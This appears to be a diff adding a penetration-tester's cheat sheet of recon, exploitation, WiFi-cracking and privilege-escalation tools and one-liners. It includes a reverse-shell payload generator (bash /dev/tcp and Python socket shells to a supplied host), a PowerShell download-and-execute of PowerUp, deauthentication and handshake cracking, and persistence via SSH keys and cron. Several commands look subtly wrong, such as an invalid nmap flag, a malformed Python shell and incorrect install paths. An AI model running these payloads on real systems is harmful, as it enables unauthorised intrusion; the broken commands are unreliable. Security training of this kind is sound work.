@@ -1,0 +1,256 @@
+# Veteran Pentester's Toolkit - Hidden Gems
+
+## 🔥 Tools That Should Be in Every Kit
+
+### Network Discovery
+| Tool | Use | Install |
+|------|-----|---------|
+| **Masscan** | Fast port scanner | `apt install masscan` |
+| **Naabu** | Fast port scanner | `go install github.com/projectdiscovery/naabu/cmd/naabu@latest` |
+| **RustScan** | Modern port scanner | `apt install rustscan` |
+| **ARP-scan** | Local discovery | `apt install arp-scan` |
+
+### Subdomain_enum
+| Tool | Use | Install |
+|------|-----|---------|
+| **Subfinder** | Passive enum | `go install github.com/projectdiscovery/subfinder/cmd/subfinder@latest` |
+| **Assetfinder** | Find subdomains | `go install github.com/tomnomnom/assetfinder@latest` |
+| **Amass** | Deep enum | `apt install amass` |
+| **Findomain** | Cross-platform | `pip install findomain` |
+
+### Web Recon
+| Tool | Use | Install |
+|------|-----|---------|
+| **httpx** | HTTP probe | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
+| **Katana** | Crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
+| **Gau** | Wayback | `go install github.com/lc/gau/v2/cmd/gau@latest` |
+| **Dalfox** | XSS scanner | `go install dalfox/dalfox@latest` |
+
+### Exploitation
+| Tool | Use | Install |
+|------|-----|---------|
+| **PayloadsAllTheThings** | Collections | `git clone https://github.com/swisskyrepo/PayloadsAllTheThings` |
+| **Impacket** | Windows tools | `pip install impacket` |
+| **Evil-WinRM** | WinRM shell | `gem install evil-winrm` |
+| **CrackMapExec** | Network attacks | `apt install crackmapexec` |
+
+## 🎯 One-Liners That Save Time
+
+### Recon
+```bash
+# Quick network map
+nmap -sn 192.168.1.0/24 | grep "Nmap" | cut -d" " -f5
+
+# Find live hosts
+for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip & done | grep from
+
+# Port scan common
+nmap -F 192.168.1.1
+
+# Service version
+nmap -sV --script-defaults 192.168.1.1
+```
+
+### Web
+```bash
+# Find hidden params
+dirb http://target /usr/share/wordlists/dirb/common.txt
+
+# Quick test all payloads
+sqlmap -u "http://target/?id=1" --batch --level=5
+
+# Spider
+wget -r -l 5 --spider http://target
+```
+
+### WiFi
+```bash
+# Handshake capture
+airodump-ng wlan0mon --bssid XX --channel 6 --write handshake
+
+# Deauth
+aireplay-ng -0 10 -a XX wlan0mon
+
+# Crack
+aircrack-ng -w wordlist.txt handshake.cap
+```
+
+## 💡 Pro Tips
+
+### 1. TMUX Workflow
+```bash
+# Start new session
+tmux new -s pentest
+
+# Split panes
+# Ctrl+b " - horizontal
+# Ctrl+b % - vertical
+
+# Navigate
+# Ctrl+b arrows
+
+# Detach: Ctrl+b d
+# Attach: tmux attach -t pentest
+```
+
+### 2. SSH Tunnel
+```bash
+# Local port forward
+ssh -L 8080:localhost:80 user@target
+
+# Dynamic proxy
+ssh -D 8080 user@target
+
+# Remote port forward
+ssh -R 8080:localhost:80 user@target
+```
+
+### 3. File Transfer
+```bash
+# HTTP server
+python3 -m http.server 8000
+
+# SCP
+scp file.txt user@target:/path/
+
+# Netcat
+nc -lvp 1234 > file.txt   # Receiver
+nc target 1234 < file.txt  # Sender
+```
+
+### 4. Persistence
+```bash
+# SSH key
+ssh-keygen -t rsa
+ssh-copy-id user@target
+
+# Cron job
+crontab -e
+# Add: 0 * * * * /path/to/script.sh
+```
+
+### 5.Priv Esc Linux
+```bash
+# Enum script
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh && ./LinEnum.sh
+
+# Kernel exploits
+searchsploit linux kernel
+```
+
+### 6. Priv Esc Windows
+```bash
+# WinPEAS
+wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEAS.exe
+
+# PowerUp
+powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks"
+```
+
+## 🛠️ Custom Scripts to Have
+
+### Quick Enum
+```bash
+#!/bin/bash
+echo "=== Quick Enum ==="
+echo "Users: $(cat /etc/passwd | grep -v nologin | wc -l)"
+echo "Sudo: $(getent group sudo | wc -l)"
+echo "Ports: $(ss -tulpn | wc -l)"
+echo "Services: $(ls /etc/init.d/ | wc -l)"
+```
+
+### Auto-Recon
+```bash
+#!/bin/bash
+target=$1
+nmap -sV -oN scan-$target.nmap $target
+nikto -h $target > nikto-$target.txt
+dirb http://$target > dirb-$target.txt
+echo "Done! Check files."
+```
+
+### Payload Generator
+```bash
+#!/bin/bash
+# Quick reverse shell
+echo "Bash: bash -i >& /dev/tcp/$1/$2 0>&1"
+echo "Python: python -c 'import socket,subprocess;s=socket.socket();s.connect((\"$1\",$2));s.send(subprocess.call([\"/bin/sh\",\"-i\"]).encode())'"
+```
+
+## 📁 Organize Your Toolkit
+
+```
+~/pentest/
+├── tools/           # Downloaded tools
+│   ├── bin/
+│   └── scripts/
+├── wordlists/      # Custom wordlists
+├── payloads/       # Shell payloads
+├── exploits/       # Found exploits
+├── results/        # Scan results
+├── notes/         # Project notes
+└── reports/       # Report templates
+```
+
+## 🔐 Hardening Checks
+
+```bash
+# Check for rootkits
+rkhunter -c
+
+# Check logs
+journalctl -xe
+
+# Check connections
+ss -tulpn
+
+# Check processes
+ps auxf
+
+# Check cron
+crontab -l
+ls -la /etc/cron.d/
+```
+
+## 🎓 Practice Targets
+
+| Site | Type |
+|------|------|
+| HackTheBox | Realistic |
+| TryHackMe | Learning |
+| PentesterLab | Specific skills |
+| Root Me | CTF |
+| OverTheWire | Wargames |
+
+## 📓 Note Taking Templates
+
+### Recon Notes
+```markdown
+# Target: example.com
+## IP: 192.168.1.1
+
+### Ports
+- 22 SSH
+- 80 HTTP
+- 443 HTTPS
+
+### Services
+- SSH: OpenSSH 7.4
+- HTTP: Apache 2.4.6
+
+### Findings
+- Web: /admin
+- SSH: Weak creds: admin:admin
+```
+
+## 📦 Essential Downloads
+
+```bash
+# Add to tools
+cd /opt
+git clone https://github.com/sullo/nikto
+git clone https://github.com/sqlmapproject/sqlmap
+git clone https://github.com/vanhauser-thc/thc-hydra
+git clone https://github.com/vanhauser-thc/theHarvester
+```
